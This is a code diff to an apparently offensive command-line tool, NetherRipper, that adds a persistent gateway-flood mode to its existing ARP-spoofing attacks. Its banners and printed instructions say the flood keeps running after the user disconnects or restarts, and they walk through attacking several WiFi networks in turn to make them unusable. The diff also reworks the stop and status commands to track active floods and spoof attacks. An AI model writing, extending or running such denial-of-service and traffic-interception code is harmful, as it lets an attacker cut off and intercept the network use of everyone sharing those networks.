@@ -20,6 +20,14 @@ import {
   monitorFlood
 } from './core/flood';
 import {
+  startPersistentFlood,
+  stopAllPersistentAttacks,
+  listPersistentAttacks,
+  formatPersistentAttacks,
+  hasActiveAttacks,
+  getCurrentSSID
+} from './core/persistent';
+import {
   loadState,
   addTarget,
   clearState,
@@ -286,16 +294,17 @@ async function cmdNuke(): Promise<void> {
 }
 
 /**
- * Command: flood (GATEWAY SATURATION)
+ * Command: flood (GATEWAY SATURATION) - Now with persistent mode!
  */
 async function cmdFlood(): Promise<void> {
   console.log(chalk.red.bold('\n╔════════════════════════════════════════════════╗'));
-  console.log(chalk.red.bold('║  🌊 GATEWAY FLOOD - TOTAL NETWORK KILL  🌊    ') + chalk.red.bold('║'));
+  console.log(chalk.red.bold('║  🌊 GATEWAY FLOOD - PERSISTENT ATTACK  🌊     ') + chalk.red.bold('║'));
   console.log(chalk.red.bold('╠════════════════════════════════════════════════╣'));
   console.log(chalk.red.bold('║  This will SATURATE the gateway bandwidth!     ') + chalk.red.bold('║'));
-  console.log(chalk.red.bold('║  ALL devices will suffer (including yours!)    ') + chalk.red.bold('║'));
+  console.log(chalk.red.bold('║  Attack runs in BACKGROUND - persists forever! ') + chalk.red.bold('║'));
   console.log(chalk.red.bold('║                                                ') + chalk.red.bold('║'));
-  console.log(chalk.red.bold('║  WiFi will become UNUSABLE for everyone!       ') + chalk.red.bold('║'));
+  console.log(chalk.red.bold('║  You can disconnect and attack keeps running!  ') + chalk.red.bold('║'));
+  console.log(chalk.red.bold('║  Attack MULTIPLE WiFi networks simultaneously! ') + chalk.red.bold('║'));
   console.log(chalk.red.bold('║                                                ') + chalk.red.bold('║'));
   console.log(chalk.red.bold('║  Press Ctrl+C to abort (5s)...                 ') + chalk.red.bold('║'));
   console.log(chalk.red.bold('╚════════════════════════════════════════════════╝\n'));
@@ -307,8 +316,12 @@ async function cmdFlood(): Promise<void> {
   const iface = await getActiveInterface();
   const networkInfo = await getNetworkInfo(iface);
   const gatewayIp = networkInfo.gateway;
+  const ssid = await getCurrentSSID(iface);
 
-  console.log(chalk.cyan(`\n🎯 Target: ${gatewayIp} (Gateway)\n`));
+  console.log(chalk.cyan(`\n🎯 Target Information:`));
+  console.log(chalk.gray(`  WiFi SSID: ${ssid}`));
+  console.log(chalk.gray(`  Gateway: ${gatewayIp}`));
+  console.log(chalk.gray(`  Interface: ${iface}\n`));
 
   // Check flood tools
   const tools = await checkFloodTools();
@@ -325,7 +338,7 @@ async function cmdFlood(): Promise<void> {
 
   // Choose intensity
   const intensity = process.env.NETHER_FLOOD_INTENSITY || 'high';
-  console.log(chalk.red(`🌊 Starting GATEWAY FLOOD at ${intensity.toUpperCase()} intensity...\n`));
+  console.log(chalk.red(`🌊 Deploying PERSISTENT FLOOD at ${intensity.toUpperCase()} intensity...\n`));
 
   // Enable IP forwarding
   const forwarding = await checkIpForwarding();
@@ -333,43 +346,38 @@ async function cmdFlood(): Promise<void> {
     await enableIpForwarding();
   }
 
-  // Start flood
-  await startGatewayFlood({
-    targetIp: gatewayIp,
-    interface: iface,
-    intensity: intensity as any,
-  });
+  // Start PERSISTENT flood
+  try {
+    const attackId = await startPersistentFlood(gatewayIp, iface, intensity);
 
-  console.log(chalk.red.bold('\n🌊 GATEWAY FLOOD ACTIVE\n'));
-  console.log(chalk.yellow('The entire network should now be EXTREMELY slow!'));
-  console.log(chalk.yellow('All devices (phones, laptops, etc.) will suffer.\n'));
-  console.log(chalk.gray('Monitoring gateway response (Ctrl+C to stop)...\n'));
-
-  // Monitor effectiveness
-  let iterations = 0;
-  const monitorInterval = setInterval(async () => {
-    iterations++;
+    console.log(chalk.red.bold('\n🌊 PERSISTENT FLOOD DEPLOYED!\n'));
+    console.log(chalk.green(`✓ Attack ID: ${attackId}`));
+    console.log(chalk.green(`✓ Target: ${gatewayIp} (${ssid})`));
+    console.log(chalk.green(`✓ Status: RUNNING IN BACKGROUND\n`));
     
-    const stats = await monitorFlood(gatewayIp);
+    console.log(chalk.yellow('🔥 Attack will continue even if you:'));
+    console.log(chalk.gray('   - Disconnect from this WiFi'));
+    console.log(chalk.gray('   - Connect to another WiFi'));
+    console.log(chalk.gray('   - Close this terminal'));
+    console.log(chalk.gray('   - Restart your laptop\n'));
     
-    if (stats.responseTime > 1000) {
-      console.log(chalk.red(`[${new Date().toISOString()}] Gateway OVERLOADED - Response: ${stats.responseTime}ms (CPU: ${stats.cpuLoad.toFixed(2)})`));
-    } else if (stats.responseTime > 500) {
-      console.log(chalk.yellow(`[${new Date().toISOString()}] Gateway STRESSED - Response: ${stats.responseTime}ms (CPU: ${stats.cpuLoad.toFixed(2)})`));
-    } else {
-      console.log(chalk.gray(`[${new Date().toISOString()}] Response: ${stats.responseTime}ms (CPU: ${stats.cpuLoad.toFixed(2)})`));
-    }
+    console.log(chalk.cyan('💡 To attack multiple WiFi networks:'));
+    console.log(chalk.gray('   1. Leave this attack running'));
+    console.log(chalk.gray('   2. Connect to another WiFi'));
+    console.log(chalk.gray('   3. Run "sudo nr flood" again'));
+    console.log(chalk.gray('   4. Repeat for WiFi #3, #4, etc.\n'));
+    
+    console.log(chalk.red('⚠️  To stop ALL attacks:'));
+    console.log(chalk.white('   sudo nr stop\n'));
 
-    // Stop after 20 checks
-    if (iterations >= 20) {
-      clearInterval(monitorInterval);
-      console.log(chalk.yellow('\nMonitoring stopped. Flood still active.'));
-      console.log(chalk.gray('Run \'sudo nr stop\' to cleanup\n'));
-    }
-  }, 3000);
+    // Show current attacks
+    console.log(chalk.cyan('📊 Currently Active Attacks:\n'));
+    console.log(formatPersistentAttacks());
 
-  // Save to global so we can stop it later
-  (global as any).__floodInterval = monitorInterval;
+  } catch (error) {
+    console.error(chalk.red(`\n❌ Failed to deploy flood: ${error}\n`));
+    throw error;
+  }
 }
 
 /**
@@ -378,10 +386,25 @@ async function cmdFlood(): Promise<void> {
 async function cmdStop(): Promise<void> {
   console.log(chalk.cyan('\n🛑 Stopping all attacks...\n'));
 
-  // Stop flood if active
+  let stoppedCount = 0;
+
+  // Stop persistent floods first
+  if (hasActiveAttacks()) {
+    const attacks = listPersistentAttacks();
+    console.log(chalk.yellow(`Found ${attacks.length} persistent flood attack(s)\n`));
+    
+    for (const attack of attacks) {
+      console.log(chalk.gray(`Stopping ${attack.id} (${attack.ssid} - ${attack.gatewayIp})...`));
+    }
+    
+    await stopAllPersistentAttacks();
+    stoppedCount += attacks.length;
+    console.log(chalk.green(`✓ Stopped ${attacks.length} persistent flood(s)\n`));
+  }
+
+  // Stop old-style flood if active
   try {
     await stopGatewayFlood();
-    console.log(chalk.green('✓ Gateway flood stopped'));
   } catch {
     // Ignore if not running
   }
@@ -392,26 +415,30 @@ async function cmdStop(): Promise<void> {
     (global as any).__floodInterval = null;
   }
 
+  // Stop ARP spoof attacks
   const state = loadState();
   
-  if (!state || state.targets.length === 0) {
-    console.log(chalk.yellow('No active target attacks to stop\n'));
-    return;
+  if (state && state.targets.length > 0) {
+    console.log(chalk.yellow(`Found ${state.targets.length} ARP spoof attack(s)\n`));
+    
+    const iface = await getActiveInterface();
+
+    for (const target of state.targets) {
+      console.log(chalk.gray(`Cleaning up rules for ${target.ip}...`));
+      await stopAttack(iface, target.rules);
+      stoppedCount++;
+    }
+
+    clearState();
+    console.log(chalk.green(`✓ Stopped ${state.targets.length} ARP spoof attack(s)\n`));
   }
 
-  const iface = await getActiveInterface();
-
-  // Stop all attacks
-  for (const target of state.targets) {
-    console.log(chalk.gray(`Cleaning up rules for ${target.ip}...`));
-    await stopAttack(iface, target.rules);
+  if (stoppedCount === 0) {
+    console.log(chalk.yellow('No active attacks to stop\n'));
+  } else {
+    console.log(chalk.green.bold(`\n✨ ALL ATTACKS STOPPED (${stoppedCount} total)`));
+    console.log(chalk.green('✓ All networks restored to normal\n'));
   }
-
-  // Clear state
-  clearState();
-
-  console.log(chalk.green('\n✓ All attacks stopped'));
-  console.log(chalk.green('✓ Network rules cleaned up\n'));
 }
 
 /**
@@ -420,14 +447,28 @@ async function cmdStop(): Promise<void> {
 async function cmdStatus(): Promise<void> {
   console.log(chalk.cyan('\n📊 NetherRipper Status\n'));
   
-  const state = loadState();
-  
-  if (!state || state.targets.length === 0) {
-    console.log(chalk.gray('No active attacks\n'));
-    return;
+  let hasAnyAttack = false;
+
+  // Show persistent floods
+  if (hasActiveAttacks()) {
+    hasAnyAttack = true;
+    console.log(chalk.red.bold('🌊 PERSISTENT FLOOD ATTACKS:\n'));
+    console.log(formatPersistentAttacks());
   }
 
-  console.log(chalk.white(formatState()));
+  // Show ARP spoof attacks
+  const state = loadState();
+  if (state && state.targets.length > 0) {
+    hasAnyAttack = true;
+    console.log(chalk.yellow.bold('🎯 ARP SPOOF ATTACKS:\n'));
+    console.log(chalk.white(formatState()));
+  }
+
+  if (!hasAnyAttack) {
+    console.log(chalk.gray('No active attacks\n'));
+  } else {
+    console.log(chalk.red('\n⚠️  Use "sudo nr stop" to stop ALL attacks\n'));
+  }
 }
 
 /**
